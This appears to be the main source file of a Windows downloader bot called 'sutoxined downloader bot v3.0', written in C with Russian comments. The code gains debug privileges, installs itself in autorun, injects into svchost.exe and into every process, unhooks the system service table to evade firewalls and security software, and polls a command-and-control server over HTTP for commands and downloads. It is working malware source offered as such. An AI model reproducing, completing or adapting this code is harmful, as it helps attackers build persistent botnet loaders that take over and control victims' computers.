/*
 *                 __                                 
 *                /\ \__                __            
 *    ____  __  __\ \ ,_\   ___   __  _/\_\    ___    
 *   /',__\/\ \/\ \\ \ \/  / __`\/\ \/'\/\ \ /' _ `\  
 *  /\__, `\ \ \_\ \\ \ \_/\ \L\ \/>  </\ \ \/\ \/\ \ 
 *  \/\____/\ \____/ \ \__\ \____//\_/\_\\ \_\ \_\ \_\
 *   \/___/  \/___/   \/__/\/___/ \//\/_/ \/_/\/_/\/_/
 * 	 	 sutoxined downloader bot v3.0
 *
 */
 
// ----------------------------------------------------------------- // 
// запуск загружаемых файлов из CreateProcessAsUser
// организация чистых загрузок
// ----------------------------------------------------------------- // 

typedef struct SUTOXIN_STRUCT
{
		char  	pcname[256];
		char  	rnduid[256];
		char  	host[256];
		char  	path[256];
		char  	injproc[256];
		
} SUTOXIN_STRUCT;
static SUTOXIN_STRUCT 	sutoxin;
				
#include 	"headers.hpp"


// ----------------------------------------------------------------- // 
DWORD WINAPI ThreadMain_StartAllProcInjThread(LPVOID lParam)
{
	InjectAllProcesses(StealthMain);
	return FALSE;
}
// ----------------------------------------------------------------- // 
DWORD WINAPI Main_InjectProcess(LPVOID lpParam)
{
	StealthLoadDlls();
	WSADATA wsaData; WSAStartup(MAKEWORD(2,2),&wsaData); 

//	char asd[256];
//	GetModuleFileName(GetModuleHandle(NULL), asd, 256);
//	OutputDebugString(asd);
	
	StartThread(ThreadMain_StartAllProcInjThread, NULL); 	// inject all processes
	
	while(TRUE)
	{
		if (CheckInternetConnection(NULL) == 0)
		{
			Sleep(1*60*1000); 
		}
		else
		{
			GetCommandViaHTTP(NULL, 0, lpParam);
			Sleep(GetRate() * 60 * 1000);
		}
	}

	return FALSE;
}
//-----------------------------------------------------------------

int APIENTRY EntryPoint(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{

	SetPrivilege(0x14, SE_DEBUG_PRIV, TRUE);
	
	HANDLE hMutex = CreateMutex(NULL, FALSE, MUTEXNAME);
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		AddToAutoRun(1);					// add to autorun
		
		// 	if restarted - inject svchost
		char pcname[256], rnduid[256];
		GetUid(pcname, rnduid);
	
			lstrcpy(sutoxin.pcname,   pcname);
			lstrcpy(sutoxin.rnduid,   rnduid);
			lstrcpy(sutoxin.host, 	  CC_HOST);
			lstrcpy(sutoxin.path,	  CC_PATH);
			lstrcpy(sutoxin.injproc,  FIRSTINJPROC);
		
		// 	inject our code in svchost.exe
		if(!StartProcInject(NULL, sutoxin.injproc, (LPTHREAD_START_ROUTINE)Main_InjectProcess, &sutoxin))
		{
			Main_InjectProcess(&sutoxin); 	// 	if inject fails
		}
		
		return TRUE;
	}

	// unhook sdt
	CheckFWs_And_Unhook();

	// restart self
	char lpSelf[256]; STARTUPINFO si = { sizeof(si) };	PROCESS_INFORMATION pi;
	GetModuleFileName(GetModuleHandle(NULL), lpSelf, MAX_PATH);
	CreateProcess(NULL, lpSelf, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
						
	Sleep(2000);
	CloseHandle(hMutex);
	return 0;
}
// ----------------------------------------------------------------- // 